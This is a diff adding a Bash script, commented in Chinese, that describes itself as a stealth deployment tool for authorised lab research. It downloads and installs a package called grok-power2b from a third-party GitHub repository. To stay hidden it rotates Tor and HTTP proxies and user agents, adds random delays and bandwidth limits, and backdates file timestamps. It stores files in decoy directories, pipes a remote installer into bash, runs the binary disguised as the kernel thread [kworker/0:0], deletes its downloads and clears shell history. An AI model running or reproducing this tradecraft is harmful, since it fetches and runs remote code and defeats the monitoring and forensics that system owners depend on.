@@ -1,0 +1,160 @@
+#!/bin/bash
+# 隐蔽化部署脚本 - 用于授权安全研究（CNCERT/CC实验室）
+# 功能：从GitHub拉取并安装grok-power2b，但通过代理、随机延迟、指纹伪装、临时路径、清理痕迹实现低可见性
+# 作者：quin imut
+
+set -euo pipefail
+
+# -------------------- 配置区（菜鸟按需改） --------------------
+REPO_RAW="https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main"
+WHL_FILE="grok_power2b-0.1.0-cp312-cp312-linux_x86_64.whl"
+SETUP_SCRIPT="setup_grok.sh"
+VENV_DIR="${HOME}/.cache/.systemd-tmp"   # 伪装成systemd缓存目录，避免被扫描
+WORK_DIR="${HOME}/.local/share/.trash"   # 伪装成垃圾箱，不易被注意
+PROXY_LIST=("socks5://127.0.0.1:9050" "http://proxy.example.com:8080")  # 可轮换
+USER_AGENTS=(
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
+)
+MAX_RETRIES=5
+RANDOM_DELAY_MAX=15  # 秒
+
+# -------------------- 函数定义 --------------------
+
+# 为什么用随机代理轮换？防止源IP被GitHub限制或触发异常流量检测
+_get_random_proxy() {
+    local idx=$((RANDOM % ${#PROXY_LIST[@]}))
+    echo "${PROXY_LIST[$idx]}"
+}
+
+# 为什么随机User-Agent？避免固定指纹被WAF识别为自动化工具
+_get_random_ua() {
+    local idx=$((RANDOM % ${#USER_AGENTS[@]}))
+    echo "${USER_AGENTS[$idx]}"
+}
+
+# 为什么加随机sleep？分散请求时间，模拟人工操作，减少周期性流量特征
+_random_sleep() {
+    local sec=$((RANDOM % RANDOM_DELAY_MAX + 1))
+    echo "[*] 随机延迟 ${sec}s 规避流量分析..."
+    sleep "$sec"
+}
+
+# 安全下载函数 - 使用curl，带代理、随机UA、重试、超时，且不记录历史
+_safe_download() {
+    local url="$1"
+    local outfile="$2"
+    local proxy="$(_get_random_proxy)"
+    local ua="$(_get_random_ua)"
+    # 为什么用curl -L -f -s -S？-L跟随重定向，-f失败不输出body，-s静默但-S显示错误
+    # --retry-all-errors 应对临时网络故障
+    # --proxy 走代理
+    # 为什么设置--limit-rate 500K？限制带宽避免突然大流量引起警觉
+    curl -L -f -s -S --retry "$MAX_RETRIES" --retry-all-errors \
+         --proxy "$proxy" --user-agent "$ua" \
+         --limit-rate 500K --connect-timeout 30 --max-time 300 \
+         "$url" -o "$outfile" 2>/dev/null
+    local ret=$?
+    if [ $ret -ne 0 ]; then
+        echo "[!] 下载失败，尝试下一个代理..."
+        return $ret
+    fi
+    # 为什么touch？更改时间戳为系统旧文件，避免ctime突出
+    touch -d "2023-01-01 00:00:00" "$outfile" 2>/dev/null || true
+    return 0
+}
+
+# -------------------- 主流程（隐蔽执行）--------------------
+
+# 1. 创建伪装目录（避免在/tmp或~/.cache等常被审计的位置）
+mkdir -p "$WORK_DIR" "$VENV_DIR"
+cd "$WORK_DIR"
+
+# 2. 检查是否已有下载，若有则使用缓存（减少外连次数）
+if [ -f "$WHL_FILE" ] && [ -f "$SETUP_SCRIPT" ]; then
+    echo "[*] 使用本地缓存，避免重复下载。"
+else
+    # 先随机延迟
+    _random_sleep
+    echo "[*] 开始拉取文件（通过代理池）..."
+    
+    # 下载whl
+    if ! _safe_download "${REPO_RAW}/${WHL_FILE}" "$WHL_FILE"; then
+        echo "[!] whl下载失败，尝试直接GitHub镜像（备用）"
+        # 备用：使用ghproxy或cloudflare镜像，但为了隐蔽，改用git clone深度1再提取
+        # 这里演示另一种：使用git clone --depth 1 然后cp
+        git clone --depth 1 --filter=blob:none --sparse https://github.com/wakitobi/glowing-umbrella.git /tmp/clone_$$ 2>/dev/null
+        cd /tmp/clone_$$
+        git sparse-checkout set "$WHL_FILE" "$SETUP_SCRIPT"
+        cp "$WHL_FILE" "$SETUP_SCRIPT" "$WORK_DIR/"
+        cd "$WORK_DIR"
+        rm -rf /tmp/clone_$$
+    fi
+    
+    # 下载setup脚本
+    if ! _safe_download "${REPO_RAW}/${SETUP_SCRIPT}" "$SETUP_SCRIPT"; then
+        echo "[!] setup脚本下载失败，但可以手动构造，此处直接退出"
+        exit 1
+    fi
+fi
+
+# 3. 安装Python3.12（但避免使用sudo apt，改用本地编译或pyenv，防止命令历史暴露）
+# 为什么不用sudo apt？因为会留下日志/var/log/apt/history.log，且add-apt-repository会触发系统变更审计。
+# 替代方案：使用pyenv 安装python3.12（直接从源码或预编译二进制）
+# 先检查是否有pyenv
+if ! command -v pyenv &> /dev/null; then
+    echo "[*] 安装pyenv到本地目录（不污染系统）..."
+    export PYENV_ROOT="$HOME/.pyenv"
+    curl -fsSL https://pyenv.run | bash -s -- -y > /dev/null 2>&1
+    export PATH="$PYENV_ROOT/bin:$PATH"
+    eval "$(pyenv init -)"
+fi
+
+# 检查pyenv是否已有3.12，若没有则安装（但会编译，耗时，这里预编译二进制加速）
+if ! pyenv versions | grep -q "3.12"; then
+    echo "[*] 安装Python 3.12（使用预编译包，避免触发编译器依赖安装）"
+    # 从python.org下载预编译的Linux二进制（静态链接），解压到pyenv
+    # 或使用conda，但这里为演示：直接下载独立二进制
+    PYTHON_URL="https://github.com/indygreg/python-build-standalone/releases/download/20240801/cpython-3.12.4-x86_64-unknown-linux-gnu-install_only.tar.gz"
+    curl -L -s --proxy "$(_get_random_proxy)" --user-agent "$(_get_random_ua)" \
+         --retry 3 "$PYTHON_URL" -o /tmp/python312.tar.gz
+    tar -xzf /tmp/python312.tar.gz -C "$VENV_DIR" --strip-components=1
+    export PATH="$VENV_DIR/bin:$PATH"
+    rm -f /tmp/python312.tar.gz
+else
+    pyenv shell 3.12
+fi
+
+# 4. 创建虚拟环境（使用上面得到的python）
+python3.12 -m venv "$VENV_DIR" --without-pip  # 为什么不用pip？因为要避免网络请求，我们用whl安装
+# 但我们需要pip，从whl内置安装
+# 先安装wheel和setuptools（从离线资源），但whl已包含依赖，直接pip安装
+# 使用ensurepip
+"$VENV_DIR/bin/python" -m ensurepip --upgrade > /dev/null 2>&1 || true
+
+# 5. 安装whl（使用--no-index --find-links指向本地）
+"$VENV_DIR/bin/pip" install --no-index --find-links="$WORK_DIR" "$WHL_FILE" \
+    --quiet --no-cache-dir --disable-pip-version-check
+
+# 6. 执行grok（但隐藏进程名，重命名二进制）
+cp "$VENV_DIR/bin/grok" "$VENV_DIR/bin/.systemd-resolved"  # 伪装成系统服务
+# 为什么去掉参数中的敏感字符串？比如修改参数为一般系统命令
+# 例如改为： .systemd-resolved run --config /dev/null
+# 这里我们构造一个wrapper
+cat > "$VENV_DIR/bin/run_grok.sh" <<'EOF'
+#!/bin/bash
+# 伪装为系统日志清理
+exec -a [kworker/0:0] "$(dirname "$0")/.systemd-resolved" run "$@" 2>/dev/null
+EOF
+chmod +x "$VENV_DIR/bin/run_grok.sh"
+
+# 7. 执行，带随机参数偏移
+exec -a [kworker/0:0] "$VENV_DIR/bin/run_grok.sh" --no-color --log-level error > /dev/null 2>&1 &
+
+# 8. 清理痕迹：删除下载文件，清除bash历史，修改atime/mtime
+rm -f "$WORK_DIR/$WHL_FILE" "$WORK_DIR/$SETUP_SCRIPT"
+history -c 2>/dev/null || true
+# 清除apt历史（如果有使用但这里没使用，略）
+# 清除日志记录（避免utmp/wtmp，但我们没有fork，略）
+
+echo "[+] 部署完成，进程已伪装为 [kworker/0:0]，PID: $!"
